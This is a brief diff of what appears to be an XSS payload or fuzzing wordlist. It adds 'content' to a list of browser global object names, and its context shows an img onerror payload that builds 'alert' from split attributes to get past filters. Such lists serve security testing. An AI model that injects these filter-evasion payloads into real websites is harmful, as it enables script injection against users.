@@ -5,6 +5,7 @@
 top
 self
 parent
+content
 windiow
 
 <img src=1 a=al c=ert onerror=top[a%2bc](0)>
